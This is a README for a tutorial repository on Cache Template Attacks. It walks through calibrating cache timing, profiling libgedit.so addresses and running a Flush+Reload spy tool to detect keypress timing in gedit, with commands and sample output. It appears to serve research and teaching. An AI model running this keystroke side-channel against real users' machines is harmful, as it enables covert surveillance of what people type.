# Cache Template Attacks

Cache Template Attacks are a generic attack technique, allowing to profile and **exploit cache-based information leakage of any program automatically**, without prior knowledge of specific software versions or even specific system information.

The "[Cache Template Attacks](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/gruss)" paper was presented by Gruss, Spreitzer and Mangard (USENIX Security 2015). The underlying cache attack used is Flush+Reload as presented by Yarom and Falkner in "[FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/yarom)" (USENIX Security 2014).

This repository is intended to be a **tutorial to perform a side-channel attack on key presses timing in text editors**. The attack is performed in three steps, that can be found in their respective folders.


-----
## One note before starting

The programs should work on x86-64 Intel CPUs, and **the examples of usage have been tested to run for gedit on Ubuntu 18.04**. The Cache Template Attacks technique is independent of the operating system. More OS specific version of the tools, as well as other tools, are provided in the [IAIK repository](https://github.com/IAIK/cache_template_attacks).

**Warning:** This code is provided as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may not detect vulnerabilities of your applications. This code is only for testing purposes. Use it only on test systems which contain no sensitive data.


-----
## Step #1: Calibration
Before starting the Cache Template Attack you have to find the cache hit/miss threshold of your system.

Use the calibration tool for this purpose, in the **calibration folder**:
```
cd calibration
make
./calibration
```
This program should print a histogram for cache hits and cache misses. 

Based on the histogram, your first task is to find a suitable threshold value.

**Note:** In the other two programs a constant ```MIN_CACHE_MISS_CYCLES``` is defined. Change it based on your threshold, if necessary.


-----
## Step #2: Key press profiling
In our example, we monitor well observable events like key presses on a text editor, e.g. gedit. You find the profiling tools in the **profiling folder**.

We first find the address range to attack.
```
$ cat /proc/`ps -A | grep gedit | grep -oE "^[0-9]+"`/maps | grep r-x | grep libgedit
7fe1cabb6000-7fe1cac8f000 r-xp 00000000 fd:01 6423718                    /usr/lib/x86_64-linux-gnu/gedit/libgedit.so
```
We do not care about the virtual addresses, but only the size of the address range and the offset in the file (which is 00000000 in this example). 

This line can directly be passed to the profiling tool in this step, where we create a template. This tool requires you to generate the events somehow. We want to profile key presses, so the simplest way to do it is to just **jam a key while the profiling tool is running**, and create a Cache Template showing which addresses react on this key press. 

Run the following commands to find keypress information leakage in gedit (the program should be running and it should have focus as soon as you started the spy script):
```
cd profiling
make
sleep 3; ./profiling 200 7faec85f5000-7faec86cf000 r-xp 20000 fd:01 11930745                   /usr/lib/x86_64-linux-gnu/gedit/libgedit.so # in our example we profile keypresses in gedit
```

You are generally looking for addresses which have high peaks, like the following (done while pressing the key N in gedit):
```
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24640,   6
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24680,  24
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x246c0,  20
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24700,  20
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24740,  48
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24780,  24
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x247c0,  22
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24800,  12
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24840,  14
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24880,  11
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x248c0,   7
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24900,   9
/usr/lib/x86_64-linux-gnu/gedit/libgedit.so, 0x24940,  10

```
The address 0x24740 had 48 cache hits during a probe duration of 200µs.

**Note down a few suitable addresses** with such high peaks. To filter false positive cache hits we should then perform a second profiling scan without jamming a key.

**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well. Out of scope of this tutorial, you can use libxdotool for this purpose. 



-----
## Step #3: Key presses

You can now start monitoring key presses events, with the spy tool in the **exploitation folder**.

Switch to an already opened gedit window before ./spy is started, and try one of the addresses you noted down in step #2, by running the following lines:
```
cd exploitation
make
sleep 3; ./spy /usr/lib/x86_64-linux-gnu/gedit/libgedit.so <addr>
```

You can then verify that the address indeed has cache hits when pressing a key (and only when pressing a key) by pressing keys in gedit and observing the output of the spy program. You may need to try several addresses to find one that does not give false positives (i.e. cache hits for other events than key presses). 

```
32208296600503: Cache Hit (152 cycles) after a pause of 622379 cycles
32211812588823: Cache Hit (152 cycles) after a pause of 1113837 cycles
32211813157561: Cache Hit (139 cycles) after a pause of 143 cycles
32211813748560: Cache Hit (142 cycles) after a pause of 177 cycles
32211842303343: Cache Hit (97 cycles) after a pause of 9344 cycles
32212655472978: Cache Hit (152 cycles) after a pause of 258912 cycles
32212656169146: Cache Hit (152 cycles) after a pause of 181 cycles
32212656572860: Cache Hit (142 cycles) after a pause of 117 cycles
32213463151480: Cache Hit (142 cycles) after a pause of 255451 cycles
```

You may also observe several cache hits events in a relatively short time frame when pressing one key. You can modify ```spy.c``` to filter out events to obtain a clean trace of single events per key press. 
